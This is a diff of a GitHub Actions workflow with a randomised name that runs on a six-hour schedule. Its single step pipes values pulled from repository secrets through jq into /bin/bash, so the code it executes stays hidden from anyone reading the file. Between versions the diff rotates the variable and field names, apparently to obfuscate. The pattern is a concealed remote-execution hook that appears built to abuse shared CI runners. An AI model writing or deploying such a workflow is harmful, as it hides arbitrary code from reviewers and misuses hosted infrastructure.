@@ -1,25 +1,24 @@
 name: lishuhuan4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
+    - cron: '44 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lishuhuan4567
         env:
-          i3: ${{ secrets.i3 }}
+          dit8200: ${{ secrets.dit8200 }}
         run: |
-          echo $i3 | jq -r .bufj3009 | /bin/bash
-          echo $leo554 | jq -r .crp193 | /bin/bash
-          echo $kgoi606 | jq -r .azo6 | /bin/bash
-          echo $du9834 | jq -r .skk663 | /bin/bash
-          echo $ss42422 | jq -r .k643 | /bin/bash
-          echo $rk06035 | jq -r .pu0 | /bin/bash
-          echo $hyng2537 | jq -r .fzu0148 | /bin/bash
-          echo $wdtgh1523 | jq -r .dw181 | /bin/bash
-          echo $n10331 | jq -r .ud15 | /bin/bash
+          echo $dit8200 | jq -r .q99 | /bin/bash
+          echo $iwkje329 | jq -r .eadc32 | /bin/bash
+          echo $qsoo1018 | jq -r .fj756 | /bin/bash
+          echo $eup745 | jq -r .xbwrv306 | /bin/bash
+          echo $fm31830 | jq -r .h3759 | /bin/bash
+          echo $mlea55474 | jq -r .hiyxi9 | /bin/bash
+          echo $nvqdc67900 | jq -r .pp808 | /bin/bash
 
